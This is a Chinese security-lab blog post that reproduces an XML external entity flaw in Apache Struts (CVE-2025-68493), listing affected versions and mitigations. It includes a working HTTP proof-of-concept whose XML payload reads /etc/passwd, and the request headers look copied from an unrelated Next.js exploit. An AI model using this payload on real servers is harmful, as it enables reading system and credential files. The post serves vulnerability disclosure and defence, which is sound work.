#  【成功复现】Apache Struts XML外部实体注入漏洞(CVE-2025-68493)  
原创 弥天安全实验室  弥天安全实验室   2026-01-15 01:40  
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=2jntd263&tp=webp#imgIndex=0 "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
  
  
**0x01漏洞介绍**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCs0ziaibNdrBAWrANHhGqvmShpJnoqCh5owjLO9dqjKYQNQ6UOc8YB3I2sC7yw53ak7WlBtXVjKtGQ/640?wx_fmt=png&from=appmsg "")  
  
  
Apache Struts是美国阿帕奇（Apache）基金会的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品，Struts 1和Struts 2。  
  
Apache Struts 2.0.0版本至2.3.37版本、2.5.0版本至2.5.33版本和6.0.0 版本至6.1.0版本存在安全漏洞，该漏洞源于缺少XML验证，容易受到XML外部实体注入攻击。  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
  
  
**0x02影响版本**  
  
2.0.0 ≤ Apache Struts ≤ 2.3.37  
  
        2.5.0 ≤ Apache Struts ≤ 2.5.33  
  
        6.0.0 ≤ Apache Struts ≤ 6.1.0  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCs0ziaibNdrBAWrANHhGqvmSdcKgl2ibmtTibib3SunBEwRsubzmOu8WD97MBK90IhibyhzmqbRkfuFfUQ/640?wx_fmt=png&from=appmsg "")  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=5 "")  
  
  
**0x03漏洞复现**  
  
  
1.访问环境  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCs0ziaibNdrBAWrANHhGqvmSmOBYoUHIgCp3FM570C1hjdrfcKasgNKcnPM01SVoSEz9Uicdjc1OHpg/640?wx_fmt=png&from=appmsg "")  
  
2.漏洞复线  
  
POC  
```
POST /struts2-xml-parser/xmlParserNoDtdParse HTTP/2
Host: 127.0.0.1
Next-Action: x
X-Nextjs-Request-Id: e9myfwgx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: uEBTJuTmVvbHxbRvCmf0m
Content-Length: 104

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

```  
  
通过回显判断漏洞利用成功  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCs0ziaibNdrBAWrANHhGqvmS7XbOz6dbGUjMDClmicm3B0pS9fj9FBrxcU45Wqb2Uh879hh8uh0pdMQ/640?wx_fmt=png&from=appmsg "")  
  
  
3.工具测试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hCs0ziaibNdrBAWrANHhGqvmSNLASw9H7fczuhaAtt2lkEke8236U1ibTibGAn0V7yYJMjsAKCXHV92Tw/640?wx_fmt=png&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
  
  
**0x04修复建议**  
  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
  
临时缓解方案  
  
1、使用自定义SAXParserFactory：将xwork.saxParserFactory设置为默认禁用外部实体的自定义工厂类；  
  
2、定义JVM级别的配置：通过系统属性配置JVM的默认XML解析器以禁用外部实体（设置为空字符串以阻止所有协议）：  
  
   -Djavax.xml.accessExternalDTD=""  
  
   -Djavax.xml.accessExternalSchema=""  
  
   -Djavax.xml.accessExternalStylesheet=""  
  
 3、在 WAF、IDS/IPS 中部署基于 POC 的检测规则，识别针对该漏洞的探测与攻击行为。  
  
    关闭未使用的功能模块，减少潜在攻击面。  
  
   使用最小权限原则，尽量不暴露服务到公网，限制访问源为可信范围。  
  
    定期更新系统及各类组件至安全版本，及时修补已知隐患。  
  
  
  建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！  
  
         
```
https://struts.apache.org/download.cgi
https://cwiki.apache.org/confluence/display/WW/S2-069
```  
  
  
  
弥天简介  
  
学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
  
口号 网安引领时代，弥天点亮未来  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&randomid=h6lqq1ue&tp=webp#imgIndex=8 "")  
  
   
  
  
知识分享完了  
  
喜欢别忘了关注我们哦~  
  
学海浩茫，  
  
予以风动，  
  
必降弥天之润！  
  
  
   弥  天  
  
安全实验室  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=u34b870m&tp=webp#imgIndex=9 "")  
  
  
  
  
